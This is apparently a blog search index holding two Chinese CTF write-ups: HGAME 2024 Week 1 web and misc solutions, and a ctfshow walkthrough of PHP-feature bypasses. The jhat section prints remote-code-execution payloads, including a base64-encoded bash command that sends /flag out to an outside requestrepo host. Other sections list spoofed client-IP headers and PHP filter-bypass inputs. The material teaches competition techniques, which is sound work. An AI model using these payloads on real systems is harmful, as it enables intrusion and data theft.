<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HgameCTF-Week1</title>
      <link href="/2024/02/06/HgameCTF-Week1/"/>
      <url>/2024/02/06/HgameCTF-Week1/</url>
      
        <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052052820.png"></p><p>刚打开可以看到这些文字，这一步考取的应该是<code>Referer</code>头</p><pre class="line-numbers language-none"><code class="language-none">可构造 Referer: vidar.club<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>BP上添加即可</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052106907.png"></p><p>这波应该是需要我们修改访问此网站浏览器信息，即<code>User-Agent</code></p><pre class="line-numbers language-none"><code class="language-none">可构造 User-Agent: Mozilla&#x2F;5.0 (Vidar; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;121.0.0.0 Safari&#x2F;537.36 Edg&#x2F;121.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052106077.png"></p><p>ok，这波通过文字描述可以得知要考取的是<code>X-Forwarded-For</code>头，但是本题如果仅使用这个头是没法得到结果的，这里用到了<code>fake ip</code>，这边BP是有插件的。</p><pre class="line-numbers language-none"><code class="language-none">可构造X-Forwarded:127.0.0.1Forwarded-For:127.0.0.1Forwarded:127.0.0.1X-Forwarded-Host:127.0.0.1X-remote-IP:127.0.0.1X-remote-addr:127.0.0.1True-Client-IP:127.0.0.1X-Client-IP:127.0.0.1Client-IP:127.0.0.1X-Real-IP:127.0.0.1Ali-CDN-Real-IP:127.0.0.1 Cdn-Src-Ip:127.0.0.1Cdn-Real-Ip:127.0.0.1CF-Connecting-IP:127.0.0.1 X-Cluster-Client-IP:127.0.0.1WL-Proxy-Client-IP:127.0.0.1Proxy-Client-IP:127.0.0.1Fastly-Client-Ip:127.0.0.1从而伪造本地用户访问  拿到flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052108084.png"></p><p>再去找一个<a href="https://www.bejson.com/jwt/">在线jwt解密&#x2F;加密 - bejson在线工具</a>，即可拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052110685.png"></p><h4 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h4><p>本题打开有个提示 <code>本网页需要靠js来确保存在</code>（英语差，勿怪），那么我们就把<code>javascript</code>给禁用后再去做咯，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052115558.png"></p><p>然后注册账号</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052118672.png"></p><p>注册完后解除js登录</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052119095.png"></p><p>最后点击拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052117698.png"></p><h4 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select Courses</h4><p>本题是选满五个课就可以拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052122331.png"></p><p>但是点击选课就会显示课程已满</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052123392.png"></p><p>但当我们对其进行一直发送，当<code>full</code>为0时，就会显示选课成功</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052124800.png"></p><p>额选的过程种可以放到<code>Intruder</code>里面，用python脚本写一个循环单个数字多次，然后将结果放到文档里面，添加进去开始攻击</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052142855.png"></p><p>可能攻击显示没有选取成功，可以放到其他浏览器或者放包看其实已经成功了</p><p>然后全部选上后可以点击选完了拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052152665.png"></p><h4 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h4><p>打开是一个2048的小游戏，不过*16，那么就不指望挑战了，看看能不能从<code>js</code>源码里面找到解决办法，但他这个源码进行了JS混淆，从里面可以找到这俩个可疑字符串</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081742781.png"></p><pre class="line-numbers language-none"><code class="language-none">I7R8ITMCnzbCn5eFIC&#x3D;6yliXfzN&#x3D;I5NMnz0XIC&#x3D;&#x3D;yzycysi70ci7y7iK<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081743216.png"></p><pre class="line-numbers language-none"><code class="language-none">V+g5LpoEej&#x2F;fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl&#x3D;QcTq6JkWK4t3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现第二个字符串是<code>[a-z,0-9,A-Z]+/=</code>，很像base的组成啊(当时我是真没想到这玩意是base换表啊)，放到cyberchef去换表一下，拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081745576.png"></p><h4 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h4><blockquote><p>题目描述                                                                                                                                                                            jhat is a tool used for analyzing Java heap dump files</p><p><strong>提示1</strong>hint1: need rce</p><p><strong>提示2</strong>hint2: focus on oql</p><p><strong>提示3</strong>hint3: 题目不出网 想办法拿到执行结果</p></blockquote><pre class="line-numbers language-none"><code class="language-none">jhat(解析Java堆转储文件)jhat命令解析Java堆转储文件，可以将堆中的对象以html的形式显示出来，包括对象的数量、大小等等。 jhat命令支持预先设计的查询，例如，显示一个已知类MyClass的所有实例，以及对象查询语言 (OQL)。 本命令在以后的版本中可能不再支持。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们还可以从本题中拿到一个附件，附件内容如下</p><pre class="line-numbers language-none"><code class="language-none">FROM openjdk:8COPY data &#x2F;CMD jhat heapdump.hprofEXPOSE 7000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#96;FROM openjdk:8&#96;: 这一行指定了基础镜像，即在构建这个镜像时所使用的基础环境。在这里，使用的是名为 &#96;openjdk&#96;，版本为 &#96;8&#96; 的镜像。&#96;COPY data &#x2F;&#96;: 这一行指示 Docker 在构建镜像时将当前目录中的 &#96;data&#96; 目录中的所有内容复制到镜像中的根目录(&#96;&#x2F;&#96;)中。这样，&#96;data&#96; 目录中的所有文件和子目录都会被复制到镜像中。&#96;CMD jhat heapdump.hprof&#96;: 这行指定了容器启动时要执行的默认命令。在这里，&#96;CMD&#96; 指定了运行 &#96;jhat heapdump.hprof&#96; 命令。这个命令通常用于分析 Java 应用程序的堆转储文件(&#96;heapdump.hprof&#96;)。在容器启动时，会执行这个命令来启动 &#96;jhat&#96; 工具，并将 &#96;heapdump.hprof&#96; 文件作为输入。&#96;EXPOSE 7000&#96;: 这行指定了容器内部的端口映射，将容器内部的 &#96;7000&#96; 端口暴露给外部。这意味着容器内运行的应用程序可以通过外部访问其运行在 &#96;7000&#96; 端口上的服务。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这题就是照佬复现了，佬博客<a href="https://blog.csdn.net/Jayjay___/article/details/136051411">HGAME 2024 WEEK1 Web方向题解 全-CSDN博客</a></p><p>第一个解决办法是利用信道了<a href="https://requestrepo.com/">Dashboard - requestrepo.com</a>，通过信道可以将flag数据带出。</p><pre class="line-numbers language-none"><code class="language-none">java.lang.Runtime.getRuntime().exec(&#39;curl -X POST --data hello aybyrecq.requestrepo.com&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过网站可以发现是有回显的</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081756180.png"></p><p>那么再通过构造<code>bash -c &quot;命令&quot;</code>。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'bash -c &#123;echo,Y3VybCAgaHR0cDovL2BjYXQgL2ZsYWdgLmF5YnlyZWNxLnJlcXVlc3RyZXBvLmNvbQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过使用<code>base64</code>解码后执行。这种方法可以绕过了直接在<code>exec</code>方法中使用Shell特性的限制。</p><p>编码获取</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081759288.png"></p><p>可以发现通过此命令已经将flag带出来了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081800235.png"></p><p>不过在佬博客里面说，由于此题是不出网的，所以上面这种方法也是非预期，真正的预期解是如下的代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> process <span class="token operator">=</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> inputStream <span class="token operator">=</span> process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> result <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> scanner<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>result<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过此代码可以拿到完整的flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081803845.png"></p><pre class="line-numbers language-none"><code class="language-none">&#96;var process &#x3D; java.lang.Runtime.getRuntime().exec(&quot;cat &#x2F;flag&quot;);&#96;：  - 这行代码创建了一个 &#96;process&#96; 变量，它调用了 Java 运行时的 &#96;exec&#96; 方法，用于执行系统命令。  - 在这里，命令是 &#96;cat &#x2F;flag&#96;，表示要执行 &#96;cat&#96; 命令来读取 &#96;&#x2F;flag&#96; 文件的内容。&#96;var inputStream &#x3D; process.getInputStream();&#96;：  - 这行代码获取了 &#96;process&#96; 对象的输入流，以便读取命令执行的结果。&#96;var scanner &#x3D; new java.util.Scanner(inputStream).useDelimiter(&quot;\\A&quot;);&#96;：  - 这行代码创建了一个 &#96;scanner&#96; 对象，用于扫描输入流中的内容。  - &#96;java.util.Scanner&#96; 是用于扫描输入的工具类。  - &#96;.useDelimiter(&quot;\\A&quot;)&#96; 表示使用 &#96;\A&#96; 作为分隔符，&#96;\A&#96; 表示输入的开头。&#96;var result &#x3D; scanner.hasNext() ? scanner.next() : &quot;&quot;;&#96;：  - 这行代码检查扫描器是否有下一行输入，如果有，则将其读取为字符串赋给 &#96;result&#96; 变量；否则，将 &#96;result&#96; 设为空字符串。&#96;result;&#96;：  - 这行代码输出 &#96;result&#96; 变量的值，即命令执行的结果。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061213764.png"></p><p>很显然，flag就在图片里，将图片存到手机上，然后从充电口看就能拿到flag了。</p><h4 id="simple-attack"><a href="#simple-attack" class="headerlink" title="simple_attack"></a>simple_attack</h4><p>第一个压缩包内容图片</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061216874.png"></p><p>第二个压缩包内容图片</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061216320.png"></p><p>可以发现里面有着相同的文件(CRC也相同)，所以我们可以考虑到明文攻击</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061218406.png"></p><p>开始攻击即可，当出现这种情况，就可以取消了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061218573.png"></p><p>然后会显示恢复，但口令未找到</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061219915.png"></p><p>此时会让你去保存一个文件，这个文件就是解密好的文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061219473.png"></p><p>打开文件里面是一个图片的base64编码，所以从网上找到<a href="https://www.lddgo.net/convert/base64-to-image">在线Base64转图片 (lddgo.net)</a>，图片即是flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061221109.png"></p><h4 id="希儿希儿希尔"><a href="#希儿希儿希尔" class="headerlink" title="希儿希儿希尔"></a>希儿希儿希尔</h4><p>下载文件是一个待修复的图片，拿到010进行修复一下，修复之前我们可以拉到最底下发现在该图片下有着一个压缩包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061235501.png"></p><p>通过脚本可以爆破出图片的宽高</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import binasciiimport structcrcbp &#x3D; open(&quot;C:&#x2F;&#x2F;Users&#x2F;&#x2F;DDD&#x2F;&#x2F;Desktop&#x2F;&#x2F;secret.png&quot;, &quot;rb&quot;).read()  # 打开图片crc32frombp &#x3D; int(crcbp[29:33].hex(), 16)  # 读取图片中的CRC校验值print(crc32frombp)for i in range(4000):  # 宽度1-4000进行枚举    for j in range(4000):  # 高度1-4000进行枚举        data &#x3D; crcbp[12:16] + \               struct.pack(&#39;&gt;i&#39;, i) + struct.pack(&#39;&gt;i&#39;, j) + crcbp[24:29]        crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff        # print(crc32)        if (crc32 &#x3D;&#x3D; crc32frombp):  # 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定            print(i, j)            print(&#39;hex:&#39;, hex(i), hex(j))            exit(0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061237815.png"></p><p>将其改到010中就可以拿到真正的图片</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061238834.png"></p><p>用Stegsolve打开找找里面是否有隐藏的信息</p><p>可以发现其中隐藏的密钥</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061239531.png"></p><p>再结合题目所示，希尔密码<a href="http://www.metools.info/code/hillcipher243.html">希尔密码(Hill Cipher)加密解密-ME2在线工具 (metools.info)</a>，加上这个密钥可以拿到flag，至于密文，我们甚至可以不去分解，直接从010拿到密文（但最好是去分一下）</p><pre class="line-numbers language-none"><code class="language-none">CVOCRJGMKLDJGBQIUIVXHEYLPNWR<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解密后，用hgame{}包裹即可</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061242300.png"></p><h4 id="来自星尘的问候"><a href="#来自星尘的问候" class="headerlink" title="来自星尘的问候"></a>来自星尘的问候</h4><p>打开是一个jpg图片，结合本题提示密码是6位弱密码，本题的考点是<code>steghide</code>和<code>stegseek</code>的利用，不过用<code>stegseek</code>可以直接拿到隐藏的内容</p><pre class="line-numbers language-none"><code class="language-none">time stegseek 解密文件 字典<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061247503.png"></p><p>至于字典的获取，可以从网上了解一下，kali也自带一个字典可以下载。然后可以找到本题的密码是123456，不过用<code>steghide</code>也是可以的。</p><pre class="line-numbers language-none"><code class="language-none">steghide extract -sf 解密文件 -p 123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解密后可以拿到一个图片</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061250502.png"></p><p>看这格式很显然是hgame{}，结合给的提示，其页面上会有这些语言的翻译，通过所给的主角名，我们可以查到这个游戏是鹰角网络的<code>来自星尘</code>。我们可以在其的官方网站中找到游戏相关图片内容</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061255181.png"></p><p>游戏内语言</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061256829.png"></p><p>实际对应</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061256248.png"></p><p>那么此时就简单了，对照破译即可。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF、新手，菜菜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php特性</title>
      <link href="/2024/02/06/php%E7%89%B9%E6%80%A7/"/>
      <url>/2024/02/06/php%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  此文章是用来刷ctfshow中web入门题的php特性部分</p><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;  $num &#x3D; $_GET[&#39;num&#39;];  if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&#123;    die(&quot;no no no!&quot;);  &#125;  if(intval($num))&#123;    echo $flag;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题考点在于php中<strong>数组绕过正则表达式</strong>、首先在第一个if判断中，不能使传入的$num含有数字，如果有就会触发die函数，preg_match第二个参数要求是字符串，如果传入数组则不会进入if语句</p><p>所以我们可以通过构造数组来进行绕过，即<strong>url+&#x2F;?num[]&#x3D;1</strong></p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401041822576.png"></p><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;  $num &#x3D; $_GET[&#39;num&#39;];  if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;    die(&quot;no no no!&quot;);  &#125;  if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;    echo $flag;  &#125;else&#123;    echo intval($num,0);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此题在第一个判断需要$num等于数字4476,然后第二个判断中，只有当$num强等于4476才会给出flag的值</p><blockquote><p><strong>intval()</strong> 函数用于获取变量的整数值。</p><p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><p><strong>int intval ( mixed $var [, int $base &#x3D; 10 ] )</strong></p><p>参数说明：</p><ul><li>$var：要转换成 integer 的数量值。</li><li>$base：转化所使用的进制。</li></ul><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul></blockquote><p>根据此我们可以构造<strong>url+&#x2F;?num&#x3D;4476a</strong> </p><pre class="line-numbers language-none"><code class="language-none">num&#x3D;+4476   正号num&#x3D;0x117c  十六进制num&#x3D;010574  八进制num&#x3D;0b1000101111100  二进制num&#x3D;4476e1  num&#x3D;4476.0  小数点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401041829247.png"></p><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpshow_source(__FILE__);include(&#39;flag.php&#39;);$a&#x3D;$_GET[&#39;cmd&#39;];if(preg_match(&#39;&#x2F;^php$&#x2F;im&#39;, $a))&#123;  if(preg_match(&#39;&#x2F;^php$&#x2F;i&#39;, $a))&#123;    echo &#39;hacker&#39;;  &#125;  else&#123;    echo $flag;  &#125;&#125;else&#123;  echo &#39;nonononono&#39;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题所想考的是<strong>正则表达式修饰符</strong>，</p><p>正则表达式的模式修正符</p><blockquote><p><strong>i</strong> 不区分大小写；<br>例如: &#x2F;abc&#x2F;i 可以匹配 abc、aBC、Abc </p><p><strong>g</strong> 全局匹配<br>如果不带g，正则过程中字符串从左到右匹配，找到第一个符合条件的即匹配成功，返回<br>如果带g，则字符串从左到右，找到每个符合条件的都记录下来，知道字符串结尾位置</p><p><strong>m</strong> 多行匹配<br>若存在换行\n并且有开始^或结束$符的情况下，和g一起使用实现全局匹配,<br>因为存在换行时默认会把换行符作为一个字符任务匹配字符串是个单行，<br>g只匹配第一行，添加m之后实现多行，每个换行符之后就是开始<br>var str &#x3D; “abcggab\nabcoab”;<br>var preg1 &#x3D; &#x2F;^abc&#x2F;gm;  str.match(preg1)  &#x2F;&#x2F; 结果为：[“abc”, “abc”]<br>var preg2 &#x3D; &#x2F;ab$&#x2F;gm;   str.match(preg2)  &#x2F;&#x2F; 结果为：[“ab”, “ab”]</p><p><strong>s</strong> 特殊字符圆点 . 中包含换行符<br>默认的圆点 . 是 匹配除换行符 \n 之外的任何单字符，加上s之后, . 中包含换行符</p><p><strong>U</strong> 只匹配最近的一个字符串;不重复匹配;<br>$mode&#x3D;”&#x2F;a(.<em>?)c&#x2F;“;<br>$preg&#x3D;”&#x2F;a.<em>c&#x2F;U”;&#x2F;&#x2F;这两个正则返回相同的值<br>$str&#x3D;”abcabbbcabbbbbc” ;<br>preg_match($mode,$str,$content);   echo $content[0];&#x2F;&#x2F;abc<br>preg_match($preg,$str,$content);   echo $content[0];&#x2F;&#x2F;abc<br>&#x2F;**&#x2F;修正符:x</em></em> 将模式中的空白忽略;<br>&#x2F;&#x2F;<strong>修正符:A</strong> 强制从目标字符串开头匹配;<br>&#x2F;&#x2F;<strong>修正符:D</strong> 如果使用$限制结尾字符,则不允许结尾有换行;<br>&#x2F;&#x2F;<strong>修正符:e</strong> 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  </p></blockquote><p>通过<strong>url+&#x2F;?cmd&#x3D;%0aphp</strong>以此绕过，%0a代表换行，所以在第一个if中由于有着m所以匹配%0a换行后绕过，第二个if不符合正则表达式中以php开头，所以也满足绕过条件。所以得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401041850255.png"></p><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;  $num &#x3D; $_GET[&#39;num&#39;];  if($num&#x3D;&#x3D;4476)&#123;    die(&quot;no no no!&quot;);  &#125;  if(intval($num,0)&#x3D;&#x3D;4476)&#123;    echo $flag;  &#125;else&#123;    echo intval($num,0);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题和php90很像，与其不同的在于<strong>第二个if判断</strong>和<strong>第三个if判断</strong>的强等于变成了弱等于，这里例如<strong>4476a、4476.0以及+4476</strong>就已经无法绕过了，必须要对$num取进制值才能使得绕过</p><pre class="line-numbers language-none"><code class="language-none">num&#x3D;0x117c  十六进制num&#x3D;010574  八进制num&#x3D;0b1000101111100  二进制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>从而得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081116340.png"></p><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;  $num &#x3D; $_GET[&#39;num&#39;];  if($num&#x3D;&#x3D;4476)&#123;    die(&quot;no no no!&quot;);  &#125;  if(preg_match(&quot;&#x2F;[a-z]&#x2F;i&quot;, $num))&#123;    die(&quot;no no no!&quot;);  &#125;  if(intval($num,0)&#x3D;&#x3D;4476)&#123;    echo $flag;  &#125;else&#123;    echo intval($num,0);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是同样的味道不过这次相较于php92多加了一个preg_match过滤,可以发现的是过滤只将英文字母给过滤掉了，那么回忆下php92，八进制是转4476是纯数字，那么本题的答案就很明显了，让num为八进制的值就可以了。</p><pre class="line-numbers language-none"><code class="language-none">num&#x3D;010574  八进制<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081122606.png"></p><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;  $num &#x3D; $_GET[&#39;num&#39;];  if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;    die(&quot;no no no!&quot;);  &#125;  if(preg_match(&quot;&#x2F;[a-z]&#x2F;i&quot;, $num))&#123;    die(&quot;no no no!&quot;);  &#125;  if(!strpos($num, &quot;0&quot;))&#123;    die(&quot;no no no!&quot;);  &#125;  if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;    echo $flag;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时第二个if判断和第四个判断又变回了强等于，其中preg_match仍然过滤了英文字母，不同的是多了一个strpos函数，过滤了开头为0的数字，但是强等于的回归，说明我们在php90中的一些值也可以使用了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">拓展strpos() 函数查找字符串在另一字符串中第一次出现的位置。注释：strpos() 函数对大小写敏感。strpos(string,find,start)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要搜索的字符串。</td></tr><tr><td align="left"><em>find</em></td><td align="left">必需。规定要查找的字符串。</td></tr><tr><td align="left"><em>start</em></td><td align="left">可选。规定在何处开始搜索。</td></tr></tbody></table><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081142961.png"></p><p>可看出如果开头为0就会导致触发die函数且preg_match过滤了字母，所以二进制和十六进制仍然不用考虑。</p><p>最终结果为</p><pre class="line-numbers language-none"><code class="language-none">num&#x3D; 010574  八进制(在本题中，前面是有一个空格的)num&#x3D;4476.0  小数点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img 